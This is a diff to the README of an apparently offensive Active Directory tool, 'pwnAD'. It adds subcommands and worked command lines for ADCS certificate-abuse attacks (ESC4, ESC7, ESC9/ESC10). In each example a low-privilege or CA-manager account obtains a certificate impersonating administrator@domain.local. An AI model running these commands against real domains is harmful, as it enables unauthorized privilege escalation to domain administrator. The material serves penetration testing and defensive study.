@@ -60,7 +60,11 @@ pwnAD [auth options] get <subcommand> [arguments]
 | Subcommand | Description |
 |------------|-------------|
 | `CA` | Certificate Authorities |
-| `adcs_req` | Request a certificate from ADCS (ESC1 exploitation via MS-ICPR) |
+| `adcs` | Full ADCS analysis (templates, CAs, ESC1-ESC15 detection) |
+| `adcs_req` | Request a certificate from ADCS (ESC1/ESC6 exploitation via MS-ICPR) |
+| `esc4` | ESC4: modify writable template, request cert, restore |
+| `esc7` | ESC7: enable SAN via ManageCA, request cert, restore |
+| `esc9` | ESC9/ESC10: swap UPN on target, request cert, restore |
 
 ### Export
 
@@ -158,6 +162,26 @@ pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get adcs_req \
 # With DNS SAN
 pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get adcs_req \
   -ca CORP-CA -template VulnTemplate -dns dc01.domain.local
+```
+
+### ADCS Exploitation (ESC4, ESC7, ESC9)
+
+```bash
+# ESC4: writable template — modify to allow SAN, request cert, restore
+pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get esc4 \
+  -ca CORP-CA -template WritableTemplate -upn administrator@domain.local
+
+# ESC7: ManageCA — enable EDITF_ATTRIBUTESUBJECTALTNAME2, request cert, restore
+pwnAD --dc-ip 192.168.1.10 -d domain.local -u caadmin -p 'Pass!' get esc7 \
+  -ca CORP-CA -upn administrator@domain.local
+
+# ESC7 with specific template and no restore
+pwnAD --dc-ip 192.168.1.10 -d domain.local -u caadmin -p 'Pass!' get esc7 \
+  -ca CORP-CA -template User -upn administrator@domain.local --no-restore
+
+# ESC9: GenericWrite on user — swap UPN, request cert (NO_SECURITY_EXTENSION template), restore
+pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' get esc9 \
+  -target victim_user -ca CORP-CA -template VulnTemplate -upn administrator@domain.local
 ```
 
 ### BloodHound CE Export
